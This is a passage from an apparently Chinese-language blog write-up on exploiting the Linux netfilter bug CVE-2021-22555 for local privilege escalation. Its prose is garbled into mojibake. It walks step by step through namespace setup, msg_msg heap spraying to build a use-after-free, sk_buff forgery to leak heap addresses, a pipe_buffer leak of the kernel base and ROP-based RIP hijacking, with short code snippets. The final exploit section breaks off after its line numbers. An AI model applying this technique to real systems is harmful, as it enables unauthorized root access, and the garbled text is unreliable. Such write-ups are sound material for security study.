msize;<br>&#125;<br>EXPORT_SYMBOL_GPL(xt_compat_match_from_user);<br></code></pre></td></tr></table></figure><h1>0x02.æ¼æ´åˆ©ç”¨</h1><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥è€ƒè™‘å¦‚ä½•åˆ©ç”¨è¿™ä¸ªè¶Šç•Œå†™ 0 çš„æ¼æ´ï¼Œç°åœ¨å…¬å¼€çš„è¿™ä¸€ä»½ exp åˆ©ç”¨ <code>msg_msg</code> æ„é€  UAFã€åˆ©ç”¨ <code>sk_buff</code> å†™å…¥ objectã€åˆ©ç”¨ <code>pipe_buffer</code> åŠ«æŒ RIPï¼Œç¬”è€…è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„æ€è·¯ï¼Œæ‰€ä»¥åé¢ç¬”è€…æ„é€  exp ä¹Ÿä¼šéµå¾ªåŒæ ·çš„æ€è·¯å®Œæˆ</p><blockquote><p>ä¸‹é¢çš„å›¾ä¾‹å¤§éƒ¨åˆ†æ¥è‡ª <a href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html">Google çš„ security research åšå®¢</a>ï¼Œéå¸¸æ„Ÿè°¢ Google åšå‡ºäº†å¦‚æ­¤ç®€å•æ˜“æ‡‚çš„å›¾ä¾‹ï¼</p></blockquote><h2 id="ææƒ">ææƒ</h2><h3 id="Step-O-å¼€å§‹å‰çš„å‡†å¤‡å·¥ä½œ">Step.O å¼€å§‹å‰çš„å‡†å¤‡å·¥ä½œ</h3><p>ä¸ºäº†è§¦å‘åˆ°æ¼æ´çš„è·¯å¾„ï¼Œæˆ‘ä»¬åº”å½“ä½¿ç”¨ <code>unshare()</code> éš”ç¦»å‡ºå¯¹åº”çš„çš„å‘½åç©ºé—´ï¼ŒåŒæ—¶ä¸ºäº†æé«˜å †å–·çš„ç¨³å®šæ€§ï¼Œæˆ‘ä»¬å°†è¿›ç¨‹ç»‘å®šåˆ°å›ºå®šæ ¸å¿ƒä¸Š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="hljs-number">0</span>)<br>    errExit(<span class="hljs-string">&quot;failed to unshare(CLONE_NEWUSER)&quot;</span>);<br><span class="hljs-keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="hljs-number">0</span>)<br>    errExit(<span class="hljs-string">&quot;failed to unshare(CLONE_NEWNET)&quot;</span>);<br><br>CPU_ZERO(&amp;cpu_set);<br>CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br></code></pre></td></tr></table></figure><blockquote><p>å¦‚æœä¸éš”ç¦»å‡ºç‹¬ç«‹å‘½åç©ºé—´çš„è¯<strong>ä¾¿ä¸ä¼šèµ°åˆ°è§¦å‘æ¼æ´çš„è·¯å¾„</strong>ï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦ <code>CAP_SYS_ADMIN</code> æƒé™ï¼Œä½œä¸ºæ™®é€šç”¨æˆ·åªèƒ½é€šè¿‡å‘½åç©ºé—´éš”ç¦»è¿›è¡Œè·å–</p></blockquote><h3 id="Step-I-å †å–·-msg-msg-ï¼Œå»ºç«‹ä¸»ä»æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ„é€ é‡å è¾…åŠ©æ¶ˆæ¯">Step.I å †å–· <code>msg_msg</code> ï¼Œå»ºç«‹ä¸»ä»æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ„é€ é‡å è¾…åŠ©æ¶ˆæ¯</h3><p>ç°åœ¨æˆ‘ä»¬æœ‰äº†ä¸€ä¸ªå †ä¸Š off-by-oneï¼Œæˆ‘ä»¬è¯¥æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿæ¯”è¾ƒæœ´ç´ çš„ä¸€ç§æ€æƒ³ä¾¿æ˜¯è¦†å†™ä¸€ä¸ªå¤´éƒ¨ä¸ºæŒ‡é’ˆçš„ç»“æ„ä½“ï¼Œåˆ©ç”¨ partial overwrite ä½¿å¾—ä¸¤ä¸ªè¿™æ ·çš„ç»“æ„ä½“çš„å¤´éƒ¨æŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªç»“æ„ä½“ï¼Œ<strong>ä»è€Œå®ç° object overlapping</strong></p><p>é‚£ä¹ˆé€‰ç”¨ä»€ä¹ˆæ ·çš„ç»“æ„ä½“ä½œä¸º victim å‘¢ï¼Ÿè¿™é‡Œæˆ‘ä»¬é€‰æ‹©ä½¿ç”¨ <code>msg_msg</code> è¿™ä¸€ç»“æ„ä½“ï¼Œå…¶é•¿åº¦å¯æ§ï¼Œä¸”å¼€å¤´æ­£å¥½æ˜¯å†…æ ¸åŒå‘é“¾è¡¨ç»“æ„ä½“ï¼Œæˆ‘ä»¬æ‰€èƒ½è¦†å†™çš„ä¸ºå…¶ next æŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br><span class="hljs-type">long</span> m_type;<br><span class="hljs-type">size_t</span> m_ts;<span class="hljs-comment">/* message text size */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-comment">/* the actual message follows immediately */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬åœ¨ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€å¤šä¸ªæ¶ˆæ¯æ—¶ï¼Œä¼šå½¢æˆå¦‚ä¸‹ç»“æ„ï¼š</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸€å¼€å§‹æ—¶å…ˆåˆ›å»ºå¤šä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¹¶åˆ†åˆ«åœ¨æ¯ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€ä¸¤æ¡æ¶ˆæ¯ï¼Œå½¢æˆå¦‚ä¸‹å†…å­˜å¸ƒå±€ï¼Œè¿™é‡Œä¸ºäº†ä¾¿åˆ©åç»­åˆ©ç”¨ï¼Œç¬¬ä¸€æ¡æ¶ˆæ¯ï¼ˆä¸»æ¶ˆæ¯ï¼‰çš„å¤§å°ä¸º 0x1000ï¼Œç¬¬äºŒæ¡æ¶ˆæ¯ï¼ˆè¾…åŠ©æ¶ˆæ¯ï¼‰çš„å¤§å°ä¸º 0x400ï¼š</p><p><img src="https://s2.loli.net/2022/03/31/ViAM3gDxpl1kQj9.png" alt="image.png"></p><p>ä¹‹åæˆ‘ä»¬è¯»å‡ºå…¶ä¸­å‡ ä¸ªæ¶ˆæ¯é˜Ÿåˆ—çš„ä¸»æ¶ˆæ¯ï¼Œå†åˆ©ç”¨ setsockopt è·å–åˆ°æˆ‘ä»¬åˆšé‡Šæ”¾çš„ <code>msg_msg</code> ç»“æ„ä½“çš„ç©ºé—´</p><p><img src="https://s2.loli.net/2022/03/31/cJjVS59m8nvI4e2.png" alt="image.png"></p><p>è¿™æ ·å°±ä¼šå¯¼è‡´ <code>xt_table_info</code> ç»“æ„ä½“è¦†å†™åˆ°å…¶ç›¸é‚»çš„ä¸»æ¶ˆæ¯çš„ next æŒ‡é’ˆï¼Œä»è€Œå¯¼è‡´<strong>åœ¨ä¸¤ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå­˜åœ¨ä¸¤ä¸ªä¸»æ¶ˆæ¯æŒ‡å‘åŒä¸€ä¸ªè¾…åŠ©æ¶ˆæ¯</strong></p><p><img src="https://s2.loli.net/2022/03/31/vOMedQBuFsiKlYD.png" alt="image.png"></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨ä¸»ä»æ¶ˆæ¯ä¸­æ”¾ç½®å¯¹åº”çš„å€¼æ¥æ ‡è¯†å–·å°„çš„ä¸åŒçš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œéå†è¯»å–æ‰€æœ‰é˜Ÿåˆ—æ¥æ„ŸçŸ¥æŒ‡å‘äº†åŒä¸€è¾…åŠ©æ¶ˆæ¯çš„ä¸¤ä¸ªé˜Ÿåˆ—</p><blockquote><p>åˆ©ç”¨ <code>MSG_COPY</code> æ ‡å¿—ä½å¯ä»¥è¯»å–æ¶ˆæ¯é˜Ÿåˆ—ä¸Šçš„æ¶ˆæ¯è€Œä¸é‡Šæ”¾ï¼Œå‚è§<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">è¿™é‡Œ</a></p></blockquote><h3 id="Step-II-é‡Šæ”¾è¾…åŠ©æ¶ˆæ¯ï¼Œæ„é€ -UAF">Step.II é‡Šæ”¾è¾…åŠ©æ¶ˆæ¯ï¼Œæ„é€  UAF</h3><p>æ­¤æ—¶æˆ‘ä»¬å°†è¾…åŠ©æ¶ˆæ¯é‡Šæ”¾æ‰ï¼Œä¾¿èƒ½æˆåŠŸå®Œæˆ UAF çš„æ„å»ºï¼Œæ­¤æ—¶<strong>æˆ‘ä»¬ä»èƒ½é€šè¿‡å…¶ä¸­ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—è®¿é—®åˆ°è¯¥è¾…åŠ©æ¶ˆæ¯å¯¹åº” objectï¼Œä½†å®é™…ä¸Šè¿™ä¸ª object å·²ç»åœ¨ freelist ä¸Šäº†</strong></p><p><img src="https://s2.loli.net/2022/03/31/nbw6aSFXIVEtDN4.png" alt="image.png"></p><h3 id="Step-III-å †å–·-sk-buff-ä¼ªé€ è¾…åŠ©æ¶ˆæ¯ï¼Œæ³„éœ²-UAF-obj-åœ°å€">Step.III å †å–· <code>sk_buff</code> ä¼ªé€ è¾…åŠ©æ¶ˆæ¯ï¼Œæ³„éœ² UAF obj åœ°å€</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å¦‚ä½•åˆ©ç”¨è¿™ä¸ª UAFï¼Œå› ä¸ºå…¶ä»ä½äºæ¶ˆæ¯é˜Ÿåˆ—ä¸Šæ‰€ä»¥æˆ‘ä»¬è€ƒè™‘ä¼ªé€  <code>msg_msg</code> ç»“æ„ä½“è¿›è¡Œåç»­çš„åˆ©ç”¨ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰ç”¨å¦å¤–ä¸€ä¸ªå¸¸ç”¨æ¥è¿›è¡Œå †å–·çš„ç»“æ„ä½“â€”â€”<code>sk_buff</code>ï¼Œç±»ä¼¼äº <code>msg_msg</code>ï¼Œå…¶åŒæ ·å¯ä»¥æä¾›è¿‘ä¹ä»»æ„å¤§å°å¯¹è±¡çš„åˆ†é…å†™å…¥ä¸é‡Šæ”¾ï¼Œä½†ä¸åŒçš„æ˜¯ <code>msg_msg</code> ç”±ä¸€ä¸ª header åŠ ä¸Šç”¨æˆ·æ•°æ®ç»„æˆï¼Œè€Œ <code>sk_buff</code> æœ¬èº«ä¸åŒ…å«ä»»ä½•ç”¨æˆ·æ•°æ®ï¼Œ<strong>ç”¨æˆ·æ•°æ®å•ç‹¬å­˜æ”¾åœ¨ä¸€ä¸ª object å½“ä¸­ï¼Œè€Œ sk_buff ä¸­å­˜æ”¾æŒ‡å‘ç”¨æˆ·æ•°æ®çš„æŒ‡é’ˆ</strong></p><p><img src="https://s2.loli.net/2022/03/31/AV8HsnZj2bUCl4J.png" alt="image.png"></p><p>è‡³äºè¿™ä¸ªç»“æ„ä½“çš„åˆ†é…ä¸é‡Šæ”¾ä¹Ÿæ˜¯ååˆ†ç®€å•ï¼Œ<strong>sk_buff åœ¨å†…æ ¸ç½‘ç»œåè®®æ ˆä¸­ä»£è¡¨ä¸€ä¸ªã€ŒåŒ…ã€ï¼Œ<strong>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯</strong>æˆ‘ä»¬åªéœ€è¦åˆ›å»ºä¸€å¯¹ socketï¼Œåœ¨ä¸Šé¢å‘é€ä¸æ¥æ”¶æ•°æ®åŒ…å°±èƒ½å®Œæˆ sk_buff çš„åˆ†é…ä¸é‡Šæ”¾</strong>ï¼Œæœ€ç®€å•çš„åŠæ³•ä¾¿æ˜¯ç”¨ socketpair ç³»ç»Ÿè°ƒç”¨åˆ›å»ºä¸€å¯¹ socketï¼Œä¹‹åå¯¹å…¶ read &amp; write ä¾¿èƒ½å®Œæˆæ”¶å‘åŒ…çš„å·¥ä½œ</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å¦‚ä½•é€šè¿‡ä¼ªé€  <code>msg_msg</code> ç»“æ„ä½“å®Œæˆä¿¡æ¯æ³„éœ²ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯å¯ä»¥ä¼ªé€ ä¸€ä¸ª <code>msg_msg</code> ç»“æ„ä½“ï¼Œå°†å…¶ <code>m_ts</code> åŸŸè®¾ä¸ºä¸€ä¸ªè¾ƒå¤§å€¼ï¼Œ<strong>ä»è€Œè¶Šç•Œè¯»å–åˆ°ç›¸é‚»è¾…åŠ©æ¶ˆæ¯çš„ headerï¼Œæ³„éœ²å‡ºå †ä¸Šåœ°å€</strong></p><p><img src="https://s2.loli.net/2022/03/31/CxE24knZqyXPgHj.png" alt="image.png"></p><p>æˆ‘ä»¬æ³„éœ²å‡ºæ¥çš„æ˜¯å“ªä¸ªåœ°å€ï¼Ÿè®©æˆ‘ä»¬é‡æ–°å°†ç›®å…‰æ”¾å›åˆ°æ¶ˆæ¯é˜Ÿåˆ—çš„ç»“æ„ä¸Šï¼š</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>æˆ‘ä»¬ä¸éš¾çŸ¥é“çš„æ˜¯ï¼Œè¯¥è¾…åŠ©æ¶ˆæ¯çš„ prev æŒ‡é’ˆæŒ‡å‘å…¶ä¸»æ¶ˆæ¯ï¼Œè€Œè¯¥è¾…åŠ©æ¶ˆæ¯çš„ next æŒ‡é’ˆæŒ‡å‘è¯¥æ¶ˆæ¯é˜Ÿåˆ—çš„ <code>msg_queue</code> ç»“æ„ï¼Œè¿™æ˜¯ç›®å‰æˆ‘ä»¬å·²çŸ¥çš„ä¸¤ä¸ªâ€œå †ä¸Šåœ°å€â€</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä¼ªé€  <code>msg_msg-&gt;next</code>ï¼Œ<strong>å°†å…¶æŒ‡å‘æˆ‘ä»¬çš„ UAF object ç›¸é‚»çš„è¾…åŠ©æ¶ˆæ¯å¯¹åº”çš„ä¸»æ¶ˆæ¯å¤´éƒ¨å¾€å‰ï¼Œä»è€Œè¯»å‡ºè¯¥ä¸»æ¶ˆæ¯çš„å¤´éƒ¨ï¼Œæ³„éœ²å‡ºå¯¹åº”çš„è¾…åŠ©æ¶ˆæ¯çš„åœ°å€</strong>ï¼Œæœ‰äº†è¿™ä¸ªè¾…åŠ©æ¶ˆæ¯çš„åœ°å€ï¼Œå†å‡å» 0x400 <strong>ä¾¿æ˜¯æˆ‘ä»¬çš„ UAF å¯¹è±¡çš„åœ°å€</strong></p><blockquote><p>é€šè¿‡ä¼ªé€  msg_msg-&gt;next å¯ä»¥å®Œæˆä»»æ„åœ°å€è¯»ï¼Œå‚è§<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">è¿™é‡Œ</a></p></blockquote><h3 id="Step-IV-å †å–·-pipe-bufferï¼Œæ³„éœ²å†…æ ¸åŸºå€">Step.IV å †å–· <code>pipe_buffer</code>ï¼Œæ³„éœ²å†…æ ¸åŸºå€</h3><p>ç°åœ¨æˆ‘ä»¬å·²çŸ¥äº†å¯æ§åŒºåŸŸçš„åœ°å€ï¼Œæ¥ä¸‹æ¥è®©æˆ‘ä»¬æ¥è€ƒè™‘æ³„éœ²å†…æ ¸ .text æ®µçš„åŸºå€ï¼Œä»¥åŠå¦‚ä½•åŠ«æŒ RIP å®Œæˆææƒ</p><p>ä¹‹å‰æˆ‘ä»¬ä¸ºä»€ä¹ˆå°†è¾…åŠ©æ¶ˆæ¯çš„å¤§å°è®¾ä¸º 0x400ï¼Ÿé™¤äº†æ–¹ä¾¿å¯¹é½ä»¥å¤–ï¼Œè¿˜æœ‰ä¸€å±‚è€ƒè™‘å°±æ˜¯è¿™ä¸ªå¤§å°åˆšå¥½æœ‰ä¸€ä¸ªååˆ†å®ç”¨çš„ç»“æ„ä½“ <code>pipe_buffer</code> æ•°ç»„ï¼Œ<strong>æ—¢èƒ½å¸®æˆ‘ä»¬æ³„éœ²å†…æ ¸ä»£ç æ®µåŸºå€ï¼Œä¹Ÿèƒ½å¸®æˆ‘ä»¬åŠ«æŒ RIP</strong></p><p>å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç®¡é“æ—¶ï¼Œåœ¨å†…æ ¸ä¸­ä¼šç”Ÿæˆæ•°ä¸ªè¿ç»­çš„ <code>pipe_buffer</code> ç»“æ„ä½“ï¼Œç”³è¯·çš„å†…å­˜æ€»å¤§å°åˆšå¥½ä¼šè®©å†…æ ¸ä» kmalloc-1k ä¸­å–å‡ºä¸€ä¸ª object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *@page: the page containing the data for the pipe buffer</span><br><span class="hljs-comment"> *@offset: offset of data inside the @page</span><br><span class="hljs-comment"> *@len: length of data inside the @page</span><br><span class="hljs-comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="hljs-comment"> *@flags: pipe buffer flags. See above.</span><br><span class="hljs-comment"> *@private: private data owned by the ops.</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>åœ¨ <code>pipe_buffer</code> ä¸­å­˜åœ¨ä¸€ä¸ªå‡½æ•°è¡¨æˆå‘˜ <code>pipe_buf_operations</code> ï¼Œå…¶æŒ‡å‘å†…æ ¸ä¸­çš„å‡½æ•°è¡¨ <code>anon_pipe_buf_ops</code>ï¼Œè‹¥æˆ‘ä»¬èƒ½å¤Ÿå°†å…¶è¯»å‡ºï¼Œä¾¿èƒ½æ³„éœ²å‡ºå†…æ ¸åŸºå€ï¼Œæ“ä½œå¦‚ä¸‹ï¼š</p><ul><li>åˆ©ç”¨ <code>sk_buff</code> ä¿®å¤è¾…åŠ©æ¶ˆæ¯ï¼Œä¹‹åä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­æ¥æ”¶è¯¥è¾…åŠ©æ¶ˆæ¯ï¼Œæ­¤æ—¶è¯¥ object é‡å› slub ä¸­ï¼Œä½† <code>sk_buff</code> ä»æŒ‡å‘è¯¥ object</li><li>å–·å°„ <code>pipe_buffer</code>ï¼Œä¹‹åå†æ¥æ”¶ <code>sk_buff</code> æ•°æ®åŒ…ï¼Œ<strong>æˆ‘ä»¬ä¾¿èƒ½è¯»å‡º pipe_buffer ä¸Šæ•°æ®ï¼Œæ³„éœ²å†…æ ¸åŸºå€</strong></li></ul><h3 id="Step-V-ä¼ªé€ -pipe-bufferï¼Œæ„é€ -ROPï¼ŒåŠ«æŒ-RIPï¼Œå®Œæˆææƒ">Step.V ä¼ªé€  pipe_bufferï¼Œæ„é€  ROPï¼ŒåŠ«æŒ RIPï¼Œå®Œæˆææƒ</h3><p>å½“æˆ‘ä»¬å…³é—­äº†ç®¡é“çš„ä¸¤ç«¯æ—¶ï¼Œä¼šè§¦å‘ <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> è¿™ä¸€æŒ‡é’ˆï¼Œè€Œ UAF object çš„åœ°å€å¯¹æˆ‘ä»¬è€Œè¨€æ˜¯å·²çŸ¥çš„ï¼Œå› æ­¤<strong>æˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨ sk_buff åœ¨ UAF object ä¸Šä¼ªé€ å‡½æ•°è¡¨ä¸æ„é€  ROP chainï¼Œå†é€‰ä¸€æ¡è¶³å¤Ÿåˆé€‚çš„ gadget å®Œæˆæ ˆè¿ç§»ä¾¿èƒ½åŠ«æŒ RIP å®Œæˆææƒ</strong></p><p><img src="https://s2.loli.net/2022/03/31/RW6HFoLJf1AE5kd.png" alt="image.png"></p><h3 id="Final-EXPLOIT">Final EXPLOIT</h3><p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span 